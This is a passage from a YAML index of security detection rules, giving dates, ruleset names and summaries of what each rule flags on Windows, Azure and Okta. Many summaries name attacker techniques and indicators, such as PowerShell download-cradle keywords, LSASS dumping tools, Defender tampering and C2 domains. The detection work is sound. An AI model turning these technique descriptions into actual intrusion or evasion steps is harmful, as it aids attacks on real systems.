  Summary: This rule detects suspicious command line flags that indicate the execution
    of commands under a different user context, similar to how PsExec-like tools operate.
    It looks for specific patterns where the command line includes flags to set a
    target user such as 'system', 'NT', or 'administrator', combined with command
    flags invoking 'cmd', 'powershell', 'whoami', 'wscript', or 'cscript'. This behavior
    is indicative of potential privilege escalation attempts.
  Updated-Date: '2024_09_04'
50dbc08b-60ce-40f1-a6b6-346497e34c88:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ce36dc291f0756c670bd6cc0e1a6ce46
  Ruleset: emerging-threats
  Summary: This rule detects the execution of renamed binary files associated with
    "cmd", "powershell", or "powershell_ise". Attackers have been observed renaming
    these binaries to "wermgr.exe" as part of exploiting CVE-2023-36874. The rule
    aims to identify such malicious behavior by monitoring process creation events
    in Windows.
  Updated-Date: '2024_09_03'
50e068d7-1e6b-4054-87e5-0a592c40c7e0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 56b613735c9244327182cced17bc94e4
  Ruleset: sigmahq
  Summary: This rule detects attempts to deactivate or reset Multi-Factor Authentication
    (MFA) in Okta. It monitors specific event types related to MFA deactivation and
    reset actions to identify potential security threats.
  Updated-Date: '2024_09_04'
50e54b8d-ad73-43f8-96a1-5191685b17a4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1f9e6b4c95f8ce9c20b9ba6082319321
  Ruleset: core
  Summary: This rule detects possible remote connections to a Silenttrinity command
    and control (C2) server through the use of the msbuild.exe process. It monitors
    network connections initiated by msbuild.exe to destination ports 80 or 443, which
    are commonly used for HTTP and HTTPS traffic, respectively. Silenttrinity is a
    post-exploitation framework that can be used by attackers to establish control
    over compromised systems.
  Updated-Date: '2024_09_03'
5118765f-6657-4ddb-a487-d7bd673abbf1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1aa8c469117c1367b1a01049df0e105a
  Ruleset: emerging-threats
  Summary: This rule detects registry markers associated with the FlowCloud malware,
    which is linked to threat group TA410. FlowCloud malware stores its configuration
    in the Windows registry and includes entries related to the malware's keylogger
    components. This detection is focused on specific registry paths and is categorized
    as a critical indicator of compromise.
  Updated-Date: '2024_09_03'
512cf937-ea9b-4332-939c-4c2c94baadcd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e38e30f0dcdb2fc368f5af260ca78f69
  Ruleset: sigmahq
  Summary: This rule detects when an Azure Firewall instance is created, modified,
    or deleted. Monitoring these specific actions within Azure's activity logs can
    help identify potential unauthorized or malicious changes to firewall configurations,
    which can be associated with tactics such as impact and defense evasion. Users
    should verify the legitimacy of the actions by assessing the user identity and
    context of the operations to rule out false positives, typically caused by routine
    administrative tasks.
  Updated-Date: '2024_09_04'
512cff7a-683a-43ad-afe0-dd398e872f36:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a3f1b12dccbdd910ca7fab0858dcd7aa
  Ruleset: sigmahq
  Summary: This rule detects instances where a Telnet service on an OpenCanary node
    has experienced a login attempt. OpenCanary is a honeypot framework used to mimic
    vulnerable or attractive devices on a network to capture data on would-be attackers.
    The rule triggers on specific application logs indicating a Telnet login attempt,
    which can be indicative of initial access or command-and-control activities by
    threat actors.
  Updated-Date: '2024_09_04'
514c50c9-373a-46e5-9012-f0327c526c8f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2fbae2d1941f17940ce8eab99181828e
  Ruleset: emerging-threats
  Summary: This rule detects potential command-and-control (C2) communication related
    to the Devil Bait malware. Specifically, it identifies HTTP GET requests to URLs
    that contain certain query parameters such as '/cross.php?op=', '&dt=', and '&uid='.
    The intent is to flag traffic patterns indicative of Devil Bait's C2 activities,
    reducing the risk of false positives to unlikely occurrences.
  Updated-Date: '2024_09_03'
514e4c3a-c77d-4cde-a00f-046425e2301e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3592493025aa3ef68f3d14d6d162af82
  Ruleset: core
  Summary: This rule detects the use of the "Set-Service" PowerShell cmdlet to configure
    a new Security Descriptor that allows a service to be hidden from utilities such
    as "sc.exe" and "Get-Service." This functionality is pertinent to PowerShell 7
    and involves monitoring for specific command-line arguments related to the security
    descriptor settings. The detection focuses on identifying the `pwsh.exe` process
    and the presence of particular command-line parameters that modify the service's
    security descriptor. This rule addresses attack techniques related to persistence,
    defense evasion, and privilege escalation.
  Updated-Date: '2024_09_03'
515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 976bb5870be0305a4964b789c521fbd8
  Ruleset: core
  Summary: This rule detects the use of the createdump.exe LOLOBIN utility to dump
    process memory, which is associated with defense evasion and credential dumping
    tactics. It specifically monitors for instances where the utility is invoked with
    command-line arguments indicative of creating memory dumps, such as '-u', '--full',
    '-f', '--name', or '.dmp'. The detection is focused on process creation events
    within Windows operating systems.
  Updated-Date: '2024_09_03'
516376b4-05cd-4122-bae0-ad7641c38d48:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 884006c69596a5eba7816c0c3d072f75
  Ruleset: core
  Summary: This rule detects a successful export of an Exchange mailbox to an untypical
    directory or with an aspx file extension, which could indicate the presence of
    a webshell or the necessary role assignments for its deployment. It identifies
    the use of the 'New-MailboxExportRequest' command with specific parameters, including
    file paths associated with shared locations and aspx file types, as well as the
    'New-ManagementRoleAssignment' command related to mailbox import/export roles.
    Such activities may suggest malicious persistence techniques within the Exchange
    environment.
  Updated-Date: '2024_09_03'
517490a7-115a-48c6-8862-1a481504d5a8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: db6b23b9c07e4250827b78f73a82d318
  Ruleset: sigmahq
  Summary: This rule detects the installation of a new shim using sdbinst.exe. Adversaries
    may use this method to establish persistence and/or elevate privileges by executing
    malicious content triggered by application shims. This detection monitors process
    creation events involving sdbinst.exe and checks for command lines containing
    ".sdb" files, while filtering out specific legitimate uses related to IIS Express.
  Updated-Date: '2024_09_04'
51aa9387-1c53-4153-91cc-d73c59ae1ca9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b85c34225a17d858ec4924940cebbf74
  Ruleset: core
  Summary: This rule detects various forms of obfuscated PowerShell IEX (Invoke-Expression)
    invocation code generated by the Invoke-Obfuscation framework. It is designed
    to identify specific patterns in the `ImagePath` of event logs with ID 7045 on
    Windows systems. These patterns include character manipulations in `$PSHome`,
    `$ShellId`, `$env:Public`, and `$env:ComSpec` variables, among others, indicative
    of obfuscation techniques used to evade security defenses.
  Updated-Date: '2024_09_03'
51ae86a2-e2e1-4097-ad85-c46cb6851de4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2b9aecf80c81096dd6a5e8d304deb5b9
  Ruleset: core
  Summary: This rule detects the suspicious execution of a renamed version of the
    PSEXESVC service. PsExec, a legitimate tool from Sysinternals, is frequently utilized
    by administrators for its powerful capabilities to execute processes on remote
    systems. However, the rule identifies instances where the service is launched
    under an unexpected or non-standard name, which could indicate malicious use or
    an attempt to evade detection. It specifically looks for processes named 'psexesvc.exe'
    that are not located in their standard directory, suggesting potential unauthorized
    or harmful activity.
  Updated-Date: '2024_09_03'
51cbac1e-eee3-4a90-b1b7-358efb81fa0a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3ddb5e3bb5382e94e113836ef05acd3a
  Ruleset: core
  Summary: This rule detects potential tampering with Windows Defender settings through
    the use of wmic.exe. Specifically, it identifies instances where wmic.exe is used
    with command lines aimed at modifying settings within the Windows Defender namespace.
    This method can be employed by malware or unauthorized users to add exclusions
    or alter security configurations, potentially bypassing Windows Defender protections.
    Notable cases include the Gootkit malware, which bypasses Windows Defender by
    setting path exclusions, and incidents where forums were hacked to spread ransomware.
  Updated-Date: '2024_09_03'
51e33403-2a37-4d66-a574-1fda1782cc31:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 17c7f2901faed11a9fd08959e6114b2b
  Ruleset: core
  Summary: This rule detects RDP login attempts originating from the localhost source
    address, which may indicate suspicious activities such as RDP tunneling. RDP tunneling
    can be used by attackers to bypass network restrictions and gain unauthorized
    access to systems. The detection focuses on Windows Security logs, specifically
    EventID 4624 with LogonType 10 and IP addresses '::1' or '127.0.0.1'.
  Updated-Date: '2024_09_03'
51eecf75-d069-43c7-9ea2-63f75499edd4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d871a7a383952d7caed402b5f8402a36
  Ruleset: emerging-threats
  Summary: This rule detects potential beaconing activity associated with the compromise
    of 3CXDesktopApp by monitoring network connections. Specifically, it identifies
    when the '3CXDesktopApp.exe' application attempts to communicate with a range
    of suspect domains such as 'akamaicontainer.com', 'azureonlinecloud.com', 'pbxsources.com',
    and 'visualstudiofactory.com'. This type of activity may indicate command-and-control
    communication with malicious infrastructure, which is relevant to early threat
    detection and response efforts.
  Updated-Date: '2024_09_03'
5205613d-2a63-4412-a895-3a2458b587b3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a1c3c8d448edfd86de72d199640386f6
  Ruleset: core
  Summary: This rule detects a network connection initiated by "AddInutil.exe," which
    is the Add-In deployment cache updating utility. Such behavior is unusual because
    this tool typically does not initiate network activity, and its occurrence could
    indicate potential command and control communication.
  Updated-Date: '2024_09_03'
52182dfb-afb7-41db-b4bc-5336cb29b464:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a963dba2ec720b9814b92a92c8a20b4d
  Ruleset: sigmahq
  Summary: "This rule detects the download of suspicious file types from well-known\
    \ file and paste sharing domains. It identifies downloads from various domains\u2014\
    including GitHub, Dropbox, MediaFire, Mega, and Pastebin\u2014that contain files\
    \ with specific extensions commonly associated with malicious activity, such as\
    \ `.exe`, `.dll`, `.lnk`, and `.vbs`. The primary objective is to detect potentially\
    \ harmful files that may be used for defense evasion and other malicious purposes.\
    \ Some false positives might occur, particularly with binaries downloaded via\
    \ GitHub."
  Updated-Date: '2024_09_04'
5259cbf2-0a75-48bf-b57a-c54d6fabaef3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 87755d0a57747391cfb569d7eab7e40f
  Ruleset: sigmahq
  Summary: This rule detects activity related to the export of user data in Bitbucket,
    such as starting, successfully completing, or failing to export user permissions.
    This monitoring is crucial as it can give insights into potential reconnaissance
    or unauthorized data collection efforts.
  Updated-Date: '2024_09_04'
526be59f-a573-4eea-b5f7-f0973207634d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 03a874985147179ecd4e9e48fc5fa2ff
  Ruleset: sigmahq
  Summary: This rule detects new process creation using WMIC (Windows Management Instrumentation
    Command-line) via the "process call create" flag. WMIC can be used to interact
    with Windows management and control from the command line, including the creation
    of new processes. This detection focuses on instances where the 'wmic.exe' process
    is used with specific command-line arguments indicative of creating new processes,
    which may signify legitimate administrative actions or potentially malicious activities.
  Updated-Date: '2024_09_04'
526cc8bc-1cdc-48ad-8b26-f19bff969cec:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 69df643ef5ed01ed5ebb9b3663990f26
  Ruleset: sigmahq
  Summary: 'This rule detects when the "index" value of a scheduled task is removed
    or deleted from the registry, which effectively hides the task from any tooling
    such as "schtasks /query". The activity is typically logged under the event type
    "DeleteKey," specifically targeting objects within the registry path: ''\SOFTWARE\Microsoft\Windows
    NT\CurrentVersion\Schedule\TaskCache\Tree\'' where "Index" is present. This is
    often associated with techniques for defense evasion in Windows environments.'
  Updated-Date: '2024_09_04'
52753ea4-b3a0-4365-910d-36cff487b789:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9f760c7d9fe451282f7782a0be539784
  Ruleset: core
  Summary: This rule detects the use of the tsclient share to place a backdoor on
    the startup folder of the source machine in a Remote Desktop Protocol (RDP) session.
    This activity indicates a potential hijack of a legitimate RDP session, which
    can be used to move laterally within a network. The detection criteria involve
    monitoring for the mstsc.exe process and any file modifications targeting the
    specific path associated with Windows startup programs. This type of behavior
    is considered highly suspicious and warrants further investigation to prevent
    command-and-control activities stemming from unauthorized access.
  Updated-Date: '2024_09_03'
52a85084-6989-40c3-8f32-091e12e13f09:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2b97e3e6e4505fe3dc3282ddbc245faa
  Ruleset: core
  Summary: This rule detects the use of the smbexec.py tool by identifying the installation
    of a specific service on a Windows system. The rule specifically looks for an
    event where the Service Control Manager logs an event with ID 7045 and a service
    named "BTOBTO." Additionally, it examines the image path of the service to check
    for strings such as '.bat & del' or '__output 2^>^&1 >,' which are indicative
    of the smbexec.py tool's operation. This tool is used for lateral movement and
    execution within a network, exploiting legitimate credentials to execute commands
    remotely.
  Updated-Date: '2024_09_03'
52cad028-0ff0-4854-8f67-d25dfcbc78b4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fb2332d6c16d83e5ac3d023d03af5950
  Ruleset: core
  Summary: This rule detects a suspicious child process initiated by Microsoft HTML
    Help (HH.EXE), a utility used to display help files with the .chm extension. The
    detection focuses on child processes such as CertReq.exe, CertUtil.exe, cmd.exe,
    cscript.exe, installutil.exe, MSbuild.exe, MSHTA.EXE, msiexec.exe, powershell.exe,
    pwsh.exe, regsvr32.exe, rundll32.exe, schtasks.exe, wmic.exe, and wscript.exe,
    which are not typically spawned by HH.EXE under normal operations. The presence
    of these child processes may indicate a potential compromise, defense evasion,
    or execution of unauthorized commands.
  Updated-Date: '2024_09_03'
52d097e2-063e-4c9c-8fbb-855c8948d135:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 871945b3ac67fc57de30e4abd0736593
  Ruleset: core
  Summary: This rule detects suspicious activity involving the Windows Update Agent
    where the process `wuauclt.exe` runs with an empty command line, lacking any command
    line flags. It is designed to identify potentially malicious behavior linked to
    defense evasion techniques. This kind of activity might be utilized by malware,
    such as the BlackByte ransomware, to execute without drawing attention. The detection
    focuses on process creation logs to monitor for instances of `wuauclt.exe` starting
    without the usual command line parameters.
  Updated-Date: '2024_09_03'
52d8b0c6-53d6-439a-9e41-52ad442ad9ad:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9ffe2c65d8a0046aaea88a6946679933
  Ruleset: core
  Summary: This rule detects the first instance of remote access to a named pipe on
    a Windows system, which is intended to help identify potential lateral movement
    and remote execution by monitoring newly observed named pipes. It specifically
    targets events where the share name matches the specified pattern but excludes
    known legitimate named pipes to reduce false positives. The rule uses EventID
    5145 to trigger detection and focuses on named pipes typically associated with
    inter-process communications. The advanced audit policy setting "Object Access
    > Audit Detailed File Share" must be configured to log the necessary events.
  Updated-Date: '2024_09_03'
52ff7941-8211-46f9-84f8-9903efb7077d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 81bfc3713bcf9020278e56dd61cd0ed0
  Ruleset: core
  Summary: This rule detects the execution of parent process ID (PPID) spoofing tools
    like the SelectMyParent tool, used for evading security defenses by misrepresenting
    the parent process ID. Indicators of such activity include the presence of specific
    keywords in the command line, certain image names, filenames, descriptions, and
    known imphashes associated with the SelectMyParent tool.
  Updated-Date: '2024_09_03'
53059bc0-1472-438b-956a-7508a94a91f0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f2b11bce1cce84d6f013ff554111510d
  Ruleset: core
  Summary: This rule detects the disabling of system firewalls, which could be an
    indication of adversaries attempting to bypass network usage controls. It monitors
    the stopping of services related to firewalld, iptables, and ufw on Linux systems.
    Disabling these firewalls can indicate attempts at defense evasion. While legitimate
    administrative actions may also trigger this detection, it requires careful scrutiny
    due to its potential severity.
  Updated-Date: '2024_09_03'
530a6faa-ff3d-4022-b315-50828e77eef5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2536357005482fffcb0de8bef19bd25c
  Ruleset: sigmahq
  Summary: This rule detects the installation of the AnyDesk software service on a
    Windows system. AnyDesk is a remote access software, and its installation could
    indicate potential abuse if the software is not already in use within the environment.
    The rule monitors for event logs generated by the Service Control Manager with
    EventID 7045, specifically looking for the entry of "AnyDesk Service."
  Updated-Date: '2024_09_04'
53207cc2-0745-4c19-bc72-80be1cc16b3f:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 82a382636e823bba91e1a02ed1e8e4e0
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation attempts of CVE-2023-21554, also
    known as QueueJumper, which is a critical unauthorized remote code execution (RCE)
    vulnerability in the Microsoft Message Queuing (MSMQ) service. The detection focuses
    on processes spawned by the MSMQ service (mqsvc.exe), specifically targeting common
    Windows scripting and execution utilities such as cmd.exe, cscript.exe, mshta.exe,
    powershell.exe, pwsh.exe, regsvr32.exe, rundll32.exe, schtasks.exe, wmic.exe,
    wscript.exe, and wsl.exe.
  Updated-Date: '2024_09_03'
5325945e-f1f0-406e-97b8-65104d393fff:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 91fe835a9b43abfa4eec9a0dcedd0fb6
  Ruleset: emerging-threats
  Summary: This rule detects potential activity of Snatch ransomware by identifying
    specific command line characteristics typically associated with its process. Snatch
    ransomware is known to reboot PCs into safe mode to bypass protection mechanisms.
    The detection focuses on identifying command lines indicating an immediate system
    shutdown and commands to stop specific services such as 'SuperBackupMan'. These
    behaviors are highly indicative of the ransomware attempting to execute its payload
    in an environment with minimal defenses.
  Updated-Date: '2024_09_03'
53330955-dc52-487f-a3a2-da24dcff99b5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c6093f95adab2ae71ba1bd8cae09956b
  Ruleset: sigmahq
  Summary: This rule detects changes to a registry database value associated with
    the BgInfo configuration on Windows systems. BgInfo is a software tool used to
    display system information on the desktop. Attackers may manipulate this registry
    value to save results from commands executed by BgInfo, potentially facilitating
    data exfiltration.
  Updated-Date: '2024_09_04'
53389db6-ba46-48e3-a94c-e0f2cefe1583:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3aa23ac8035a9b4f8e55d79732596210
  Ruleset: sigmahq
  Summary: This rule detects Windows DCE-RPC functions indicative of persistence techniques
    on a remote system. It focuses on specific operations across various endpoints,
    including 'RpcAddMonitor' and 'RpcAddPrintProcessor' for the 'spoolss' endpoint,
    'RpcAsyncAddMonitor' and 'RpcAsyncAddPrintProcessor' for the 'IRemoteWinspool'
    endpoint, and 'SeclCreateProcessWithLogonW' and 'SeclCreateProcessWithLogonExW'
    for the 'ISecLogon' endpoint. These detections point to activities that may be
    used to maintain access or control over a system, although they may also overlap
    with legitimate administrative or troubleshooting tasks.
  Updated-Date: '2024_09_04'
534f2ef7-e8a2-4433-816d-c91bccde289b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 67497f450d8f1cb0ace594bff3b09819
  Ruleset: core
  Summary: This rule detects suspicious starts of explorer.exe that utilize the /NOUACCHECK
    flag. This flag allows all subprocesses of the newly started explorer.exe to run
    without any User Account Control (UAC) checks, potentially enabling an attacker
    to bypass UAC protections and execute malicious activities with elevated privileges.
    The detection specifically looks for the command line containing the /NOUACCHECK
    flag and the process image path ending with \explorer.exe, while filtering out
    known legitimate activities such as certain domain controller user logons.
  Updated-Date: '2024_09_03'
536e2947-3729-478c-9903-745aaffe60d2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 415f5ccd2ad6aefc47c7289f1284315e
  Ruleset: sigmahq
  Summary: This rule detects suspicious PowerShell invocation command parameters that
    may indicate malicious activity. It identifies command lines containing specific
    keywords and patterns typically associated with PowerShell tasks used in defense
    evasion tactics. These include commands with parameters like '-nop', 'hidden',
    '[Convert]::FromBase64String', 'iex', 'New-Object', 'bypass', '-Enc', 'reg add
    \software\', 'new-object system.net.webclient', and '.Download'. The rule also
    filters out benign activity related to Chocolatey's legitimate processes to reduce
    false positives.
  Updated-Date: '2024_09_04'
5394fcc7-aeb2-43b5-9a09-cac9fc5edcd5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 37a79c766dda546cfaf1dea8d4db96e8
  Ruleset: core
  Summary: This rule detects the execution of the Windows Error Reporting manager
    (wermgr.exe) from non-standard locations. Wermgr.exe is typically found in system
    directories such as 'C:\Windows\System32\', 'C:\Windows\SysWOW64\', or 'C:\Windows\WinSxS\'.
    Execution from a different location could indicate malicious activity, as attackers
    might exploit this executable to mask their behavior.
  Updated-Date: '2024_09_03'
53acd925-2003-440d-a1f3-71a5253fe237:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8c34e86ae897dec68fff2448d1b36a77
  Ruleset: core
  Summary: This rule detects sign-ins originating from an anonymous IP address, which
    could indicate the use of anonymous browsers or VPNs. This kind of activity is
    often associated with credential access attacks. It checks for risk events classified
    as 'anonymizedIPAddress' within Azure's risk detection service. While such flaggings
    should be thoroughly investigated, it is recommended to consider these sessions
    in the context of other sign-ins to determine their legitimacy.
  Updated-Date: '2024_09_03'
53ad8e36-f573-46bf-97e4-15ba5bf4bb51:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5614cdbfda632dfdc71d37f60bf024f4
  Ruleset: core
  Summary: This rule detects potential attempts to set the Directory Services Restore
    Mode (DSRM) administrator password. The DSRM account is a local administrator
    account on Domain Controllers, and attackers may change its password to gain persistence
    on the system. The detection relies on monitoring for EventID 4794 from the Windows
    Security log.
  Updated-Date: '2024_09_03'
53b1b378-9b06-4992-b972-dde6e423d2b4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a5b375b99001ea65e4a10a2d9fdaa76a
  Ruleset: core
  Summary: This rule detects attempts to extract passwords on macOS systems by monitoring
    for the use of the `grep` command in conjunction with the keyword 'password' and
    any use of the 'laZagne' tool. Grep is a command-line utility used for searching
    plain-text data for lines that match a regular expression, while laZagne is an
    open-source application used to retrieve passwords stored on a machine. The detection
    focuses on process creation events to identify these specific command executions,
    indicating potential credential access activities.
  Updated-Date: '2024_09_03'
53ba33fd-3a50-4468-a5ef-c583635cfa92:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cb3da661fa0bffc7b8fe7c86af25fc9d
  Ruleset: emerging-threats
  Summary: This rule detects the persistence mechanism used by the OilRig Advanced
    Persistent Threat (APT) through scheduled tasks as reported by Nyotron in March
    2018. Specifically, it identifies instances where the Service Control Manager
    logs events indicating the creation of services named 'SC Scheduled Scan' or 'UpdatMachine'
    with Event ID 7045 on Windows systems. These service names are associated with
    OilRig's persistence techniques, which maliciously ensure long-term access to
    affected systems.
  Updated-Date: '2024_09_03'
53bb4f7f-48a8-4475-ac30-5a82ddfdf6fc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 281847555c24d7d54588fba3c17a75d0
  Ruleset: core
  Summary: This rule detects successful authentications from potential clients using
    legacy authentication methods identified via specific user agent strings, which
    may indicate an MFA bypass through a password spray attack.
  Updated-Date: '2024_09_03'
53d4bb30-3f36-4e8a-b078-69d36c4a79ff:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7f37b3fabeac0959b96f19af76006660
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Xwizard tool with the "RunWizard"
    flag and an argument in the form of a GUID. Xwizard is a utility that can be exploited
    to run custom COM objects that have been created in the registry. This behavior
    can indicate an attempt at defense evasion by executing code through COM objects.
  Updated-Date: '2024_09_04'
53d8d3e1-ca33-4012-adf3-e05a4d652e34:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b0abe20bfef83d82139b7b6dbcf50884
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "dotnet-dump" tool with the "collect"
    flag, which may signify an attempt to dump the memory of critical processes like
    LSASS.
  Updated-Date: '2024_09_04'
53ef0cef-fa24-4f25-a34a-6c72dfa2e6e2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c93b068695ca28bfcfc58393c601d453
  Ruleset: sigmahq
  Summary: This rule detects the usage of the system binary "query.exe" on Windows,
    which is used to gather information such as active sessions and running processes.
    The activity is identified by monitoring the process creation logs for instances
    where "query.exe" is executed with specific command-line parameters aimed at exfiltrating
    session and process information.
  Updated-Date: '2024_09_04'
54127bd4-f541-4ac3-afdb-ea073f63f692:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6986f51f66c89a3417e326495fd049fa
  Ruleset: sigmahq
  Summary: This rule detects the creation of new ".dll" files within the plugins directory
    of a Notepad++ installation by any process other than "gup.exe," which could indicate
    potential persistence. The detection focuses on file events where the target filename
    contains '\Notepad++\plugins\' and ends with '.dll'. It excludes instances where
    the process image points to '\Notepad++\updater\gup.exe', or commonly encountered
    installation paths. This might produce false positives during the initial installation
    of Notepad++ or legitimate use of custom plugins by users.
  Updated-Date: '2024_09_04'
542b9912-c01f-4e3f-89a8-014c48cdca7d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b8a495c52e47f2bcea104ca9232bd172
  Ruleset: sigmahq
  Summary: This rule detects when a device in Azure is no longer managed or compliant
    by identifying relevant messages in activity logs. This can indicate potential
    security issues or administrative oversights, such as an administrator forgetting
    to review the device.
  Updated-Date: '2024_09_04'
545a5da6-f103-4919-a519-e9aec1026ee4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e2c97175396cb92e4b7225df5f31b629
  Ruleset: core
  Summary: This rule detects a suspicious crash of the Microsoft Malware Protection
    Engine, specifically focusing on events where "MsMpEng.exe" and "mpengine.dll"
    appear in the application error logs. The detection is set to trigger on events
    with EventID 1000 from the "Application Error" provider. This kind of crash can
    be indicative of a security issue or an attempt to evade defense mechanisms.
  Updated-Date: '2024_09_03'
5468045b-4fcc-4d1a-973c-c9c9578edacb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 589001fe19c6405871ed19c3853e0fbd
  Ruleset: core
  Summary: This rule detects direct access to raw pastes in various paste services
    that are commonly leveraged by malware in their second stages to download malicious
    code in an encrypted or encoded form. The identified services include popular
    paste sites such as paste.ee, pastebin.com, hastebin.com, ghostbin.co, pastetext.net,
    and pastebin.pl. While legitimate users, such as developers sharing code snippets,
    might also generate similar traffic, this behavior is flagged due to its frequent
    association with malware activity.
  Updated-Date: '2024_09_03'
54773c5f-f1cc-4703-9126-2f797d96a69d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 30151c8c71c0e7607bf07ea63c8ab15f
  Ruleset: sigmahq
  Summary: This rule detects the execution of Advanced Port Scanner software on Windows
    systems. Advanced Port Scanner is a network scanning tool used to identify open
    ports on devices within a network. The detection is based on identifying specific
    file attributes or command-line parameters associated with this software. Potential
    false positives include legitimate administrative usage or other tools exhibiting
    similar command-line behavior.
  Updated-Date: '2024_09_04'
54786ddc-5b8a-11ed-9b6a-0242ac120002:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e45f977a9222986aeb636948870feba1
  Ruleset: core
  Summary: This rule detects a suspicious combination of the "ping" and "del" commands,
    a technique often employed by ransomware. The method typically involves using
    the "ping" command to create a delay of a few seconds, followed by the "del" command
    to delete specific files. This sequence is used to conceal files responsible for
    the initial infection. The rule specifically looks for instances where the command
    line contains elements indicative of this behavior, such as the presence of "ping"
    and "del," in conjunction with specific parameters like "-n," "> Nul," "-f," and
    "-q."
  Updated-Date: '2024_09_03'
547dfc53-ebf6-4afe-8d2e-793d9574975d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7607b156c9be8a64a21484d2afca3504
  Ruleset: sigmahq
  Summary: This rule detects instances where a REDIS service on an OpenCanary node
    has had an action command attempted. OpenCanary is a honeypot software used to
    mimic various services to detect unauthorized access, and in this case, it identifies
    potentially malicious activity targeting the REDIS service.
  Updated-Date: '2024_09_04'
5496ff55-42ec-4369-81cb-00f417029e25:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2072b0784135900a6acb966f82061946
  Ruleset: sigmahq
  Summary: This rule detects user login attempts that experience multifactor authentication
    (MFA) failures. Such instances may indicate that an attacker has the correct password
    for the account but cannot complete the MFA challenge, suggesting a potential
    security threat. The rule monitors Azure sign-in logs for specific result types
    and descriptions related to failed strong authentication requests.
  Updated-Date: '2024_09_04'
5498fc09-adc6-4804-b9d9-5cca1f0b8760:
  Created-Date: '2024_09_04'
  Custom-Edited: false
